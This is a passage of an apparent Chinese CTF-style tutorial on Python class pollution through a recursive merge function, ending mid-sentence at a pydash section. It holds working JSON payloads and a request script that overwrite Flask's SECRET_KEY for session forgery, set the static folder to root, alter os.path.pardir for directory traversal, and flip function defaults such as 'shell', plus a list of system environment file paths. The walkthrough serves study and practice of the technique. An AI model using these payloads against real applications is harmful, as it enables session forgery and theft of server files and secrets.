+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">a = 1</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line">def demo():</span><br><span class="line">    pass</span><br><span class="line">class A:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">class B:</span><br><span class="line">    classa = 2</span><br><span class="line"></span><br><span class="line">instance = A()</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;a&quot;:4,</span><br><span class="line">            &quot;B&quot;:&#123;</span><br><span class="line">                &quot;classa&quot;:5</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print(B.a)</span><br><span class="line">print(a)</span><br><span class="line">merge(payload, instance)</span><br><span class="line">print(B.a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20231119132251-af51c900-869b-1.png" alt="img" /></p>
+<h3 id="获取其他模块"><a class="markdownIt-Anchor" href="#获取其他模块"></a> 获取其他模块:</h3>
+<p>在全局变量的前提下，是我们都在入口文件中的类对象或者属性来进行操作的，但是如果我们操作的位置在入口文件中，而目标对象并不在入口文件当中，这时候我们就需要对其他加载过的模块来获取了</p>
+<h4 id="import加载获取"><a class="markdownIt-Anchor" href="#import加载获取"></a> import加载获取：</h4>
+<p>在简单的关系情况下，我们可以直接通过import来进行加载，在payload中我们只需要对对应的模块重新定位就可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import demo</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;demo&quot;:&#123;</span><br><span class="line">                &quot;a&quot;:4,</span><br><span class="line">                &quot;B&quot;:&#123;</span><br><span class="line">                    &quot;classa&quot;:5</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">##demo.py</span><br><span class="line">a = 1</span><br><span class="line">class B:</span><br><span class="line">    classa = 2</span><br></pre></td></tr></table></figure>
+<h4 id="sys模块加载获取"><a class="markdownIt-Anchor" href="#sys模块加载获取"></a> sys模块加载获取：</h4>
+<p>在很多环境当中，会引用第三方模块或者是内置模块，而不是简单的import同级文件下面的目录，所以我们就要借助sys模块中的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块：</p>
+<p>同样是刚才的情景，因为我们已经加载过demo.py了，所以我们用sys来对里面的目标进行获取,但是存在一个问题就是，我们的payload传参的时候大概率是在它源码已有的基础上进行传参，很有可能源码中没有引入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;sys&quot; : &#123;</span><br><span class="line">                &quot;modules&quot; : &#123;</span><br><span class="line">                    &quot;模块名&quot; : &#123;</span><br><span class="line">						&quot;全局变量&quot; : x,</span><br><span class="line">		                &quot;类&quot; : &#123;</span><br><span class="line">		                    &quot;类变量&quot; : &quot;y&quot;</span><br><span class="line">		                &#125;</span><br><span class="line">		            &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="加载器loader获取"><a class="markdownIt-Anchor" href="#加载器loader获取"></a> 加载器loader获取：</h4>
+<p>loader加载器在python中的作用是为实现模块加载而设计的类，其在<code>importlib</code>这一内置模块中有具体实现。而<code>importlib</code>模块下所有的<code>py</code>文件中均引入了<code>sys</code>模块，这样我们和上面的sys模块获取已加载模块就联系起来了，所以我们的目标就变成了只要获取了加载器loader，我们就可以通过<code>loader.__init__.__globals__['sys']</code>来获取到sys模块，然后再获取到我们想要的模块。</p>
+<p>那么我们现在的目标就变成了获取loader：</p>
+<p>在Python中，<code>__loader__</code>是一个内置的属性，包含了加载模块的loader对象，Loader对象负责创建模块对象，通过<code>__loader__</code>属性，我们可以获取到加载特定模块的loader对象。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"># 获取模块的loader</span><br><span class="line">loader = math.__loader__</span><br><span class="line"># 打印loader信息</span><br><span class="line">print(loader)</span><br></pre></td></tr></table></figure>
+<p>在这个例子当中我们就能够明白，math模块的<code>__loader__</code>属性包含了一个loader对象，负责加载math模块</p>
+<p>在python中还存在一个<code>__spec__</code>，包含了关于类加载时候的信息，他定义在<code>Lib/importlib/_bootstrap.py</code>的类<code>ModuleSpec</code>，所以可以直接采用<code>&lt;模块名&gt;.__spec__.__init__.__globals__['sys']</code>获取到<code>sys</code>模块</p>
+<h2 id="函数形参默认值替换"><a class="markdownIt-Anchor" href="#函数形参默认值替换"></a> 函数形参默认值替换：</h2>
+<p>在Python中，<code>__defaults__</code>是一个元组，用于存储函数或方法的默认参数值。当我们去定义一个函数时，可以为其中的参数指定默认值。这些默认值会被存储在<code>__defaults__</code>元组中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def a(var_1, var_2 =2, var_3 = 3):</span><br><span class="line">    pass</span><br><span class="line">print(a.__defaults__)</span><br><span class="line">#(2, 3)</span><br></pre></td></tr></table></figure>
+<p>所以我们就可以通过替换该属性，来实现对函数位置或者是键值默认值替换，但是前提条件是我们要替换的值是元组的形式：`</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;demo&quot; : &#123;</span><br><span class="line">                &quot;__defaults__&quot; : (True,)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>__kwdefaults__</code>是以字典形式来进行收录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">            &quot;demo&quot; : &#123;</span><br><span class="line">                &quot;__kwdefaults__&quot; : &#123;</span><br><span class="line">                    &quot;shell&quot; : True</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="关键信息替换"><a class="markdownIt-Anchor" href="#关键信息替换"></a> 关键信息替换：</h2>
+<h3 id="flask密钥替换"><a class="markdownIt-Anchor" href="#flask密钥替换"></a> flask密钥替换：</h3>
+<p>如果我们可以对密钥进行替换，赋值为我们想要的，我们就可以进行任意的session伪造，这里因为secret_key是在当前入口文件下面的，所以我们可以直接通过<code>__init__.__globals__</code>获取全局变量，然后通过app.config[“SECRET_KEY”]来进行污染：下面用一下师傅的示范的板子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;[+]Config:%s&quot;%(app.config[&#x27;SECRET_KEY&#x27;])</span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure>
+<p>这里我们并无法确定secretkey是什么，所以如果能够污染我们就可以实现任意的session伪造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;username&quot;: &quot;wi&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;wi&quot;,</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;app&quot;: &#123;</span><br><span class="line">                &quot;config&quot;: &#123;</span><br><span class="line">                    &quot;SECRET_KEY&quot;: &quot;baozongwi&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以直接写脚本污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &quot;url&quot;</span><br><span class="line"></span><br><span class="line">payload=&#123;</span><br><span class="line">    &quot;username&quot;: &quot;wi&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;wi&quot;,</span><br><span class="line">    &quot;__init__&quot;: &#123;</span><br><span class="line">        &quot;__globals__&quot;: &#123;</span><br><span class="line">            &quot;app&quot;: &#123;</span><br><span class="line">                &quot;config&quot;: &#123;</span><br><span class="line">                    &quot;SECRET_KEY&quot;: &quot;fmx&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, json=payload)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以参考DSBCTF的题解</p>
+<h3 id="污染静态根目录"><a class="markdownIt-Anchor" href="#污染静态根目录"></a> 污染静态根目录</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123&quot;,&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;app&quot;:&#123;&quot;_static_folder&quot;:&quot;/&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>常见的linux系统下环境变量的路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/proc/1/environ  //找不到flag文件的大部分情况下</span><br><span class="line"></span><br><span class="line">/etc/profile</span><br><span class="line"></span><br><span class="line">/etc/profile.d/*.sh</span><br><span class="line"></span><br><span class="line">~/.bash_profile</span><br><span class="line"></span><br><span class="line">~/.bashrc</span><br><span class="line"></span><br><span class="line">/etc/bashrc</span><br></pre></td></tr></table></figure>
+<h3 id="_got_first_request"><a class="markdownIt-Anchor" href="#_got_first_request"></a> _got_first_request：</h3>
+<p>用于判定是否某次请求为自<code>Flask</code>启动后第一次请求，是<code>Flask.got_first_request</code>函数的返回值，此外还会影响装饰器<code>app.before_first_request</code>的调用，而<code>_got_first_request</code>值为假时才会调用：</p>
+<p>所以如果我们想调用第一次访问前的请求，还想要在后续请求中进行使用的话，我们就需要将_got_first_request从true改成false然后就能够在后续访问的过程中，仍然能够调用装饰器app.before_first_request下面的可用信息。</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;Is flag here?&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(app, <span class="string">&quot;special&quot;</span>) <span class="keyword">and</span> app.special == <span class="string">&quot;U_Polluted_It&quot;</span>:</span><br><span class="line">        flag = <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="built_in">setattr</span>(app, <span class="string">&quot;special&quot;</span>, <span class="string">&quot;U_Polluted_It&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">payload=&#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>:&#123;</span><br><span class="line">            <span class="string">&quot;app&quot;</span>:&#123;</span><br><span class="line">                <span class="string">&quot;_got_first_request&quot;</span>:<span class="literal">False</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="ospathpardir"><a class="markdownIt-Anchor" href="#ospathpardir"></a> os.path.pardir:</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#app.py</span><br><span class="line"></span><br><span class="line">from flask import Flask,request</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    # Recursive merge function</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    if request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    return &quot;flag in ./flag but heres only static/index.html&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=&quot;0.0.0.0&quot;)</span><br></pre></td></tr></table></figure>
+<p>我们进行目录穿梭进行访问发现报了500的错误：</p>
+<p><img src="../images/image-20251006212715141.png" alt="image-20251006212715141" /></p>
+<p>这个地方就是模板渲染的时候，防止目录穿梭进行的一个操作，而我们的os.path.pardir恰好是我们的…所以会进行报错，所以我们如果把这个地方进行修改为除…外的任意值，我们就可以进行目录穿梭了。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;pardir&quot;</span><span class="punctuation">:</span><span class="string">&quot;,&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20251006212742594.png" alt="image-20251006212742594" /></p>
+<p>例题：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dst</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Game0x = Dst()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), Game0x)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, Game0x=Game0x)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Not Found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9000</span>)</span><br></pre></td></tr></table></figure>
+<p>payload如上所示</p>
+<h2 id="pydash原型链污染"><a class="markdownIt-Anchor" href="#pydash原型链污染"></a> pydash原型链污染</h2>
+<p>pydash中有个set_函数</p>
+<p><img src="../images/image-10.png" alt="Pydash中的原型链污染" /></p>
+<p>可以访问修改指定函数或者模块中的值，如下面这串代码</p>
